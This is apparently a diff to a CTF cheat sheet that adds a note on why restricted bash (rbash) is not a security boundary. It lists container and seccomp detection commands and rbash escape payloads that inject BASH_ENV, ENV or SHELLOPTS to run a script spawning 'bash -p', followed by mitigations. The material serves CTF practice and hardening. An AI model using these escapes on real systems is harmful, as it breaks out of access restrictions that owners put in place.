@@ -318,6 +318,43 @@ exec 1>&0              # duplicate the socket fd onto stdout for future cmds
 
 ---
 
+## 2024 Hardening Note — rbash Is NOT a Security Boundary
+
+**Reality:** `rbash` (restricted bash) is a *usability* feature, not a security boundary. Challenges and real deployments that rely on `rbash` alone are trivially bypassed via environment vectors and container escapes.
+
+**Container / sandbox detection (check first):**
+```bash
+ls -la /.dockerenv           # Docker marker
+cat /proc/self/cgroup        # "docker" / "kubepods" / "containerd" entries
+cat /proc/self/mountinfo | grep -q overlay && echo "container overlayfs"
+# seccomp profile active?
+grep -i seccomp /proc/self/status
+cat /proc/self/seccomp 2>/dev/null || grep Seccomp /proc/self/status
+```
+
+**Env vector — BASH_ENV / ENV / SHELLOPTS via `VAR=value allowed-cmd`:**
+`rbash` allows `VAR=value command` prefixes on allowed binaries. `BASH_ENV` (bash), `ENV` (sh), and `SHELLOPTS` are parsed on startup of *non-interactive* shells:
+
+```bash
+# If `env` or any command with VAR= prefix is allowed:
+BASH_ENV=/tmp/pwn.sh cat allowed_file
+# /tmp/pwn.sh runs before cat: e.g. echo 'bash -p' > /tmp/pwn.sh
+
+# Variant via ENV (POSIX sh) and SHELLOPTS:
+ENV=/tmp/pwn.sh sh -c 'allowed_cmd'
+SHELLOPTS=xtrace BASH_ENV=/tmp/pwn.sh bash -c 'allowed_cmd'
+
+# General bypass:
+VAR=value allowed-cmd   # VAR propagates as env; BASH_ENV/ENV triggers source on shell init
+```
+
+**Mitigations to check / recommend:**
+- Unset `BASH_ENV`, `ENV`, `SHELLOPTS`, `LD_PRELOAD`, `LD_LIBRARY_PATH` on shell entry (`env -i` or `unset`)
+- Check `/.dockerenv`, `/proc/self/cgroup`, and `seccomp` status before assuming `rbash` confinement
+- Use `seccomp` filters + proper container (not just rbash) for isolation
+
+**Key insight:** rbash NOT boundary — check `/.dockerenv` + `/proc/self/cgroup` + `seccomp`, and exploit `BASH_ENV`/`ENV`/`SHELLOPTS` via `VAR=value allowed-cmd` env injection when any `VAR= cmd` prefix is permitted.
+
 ## References
 
 - 0xL4ugh CTF "HashCashSlash": Filter `^[\\#\$]+$`, payload `\$$#`, internal socat flag service
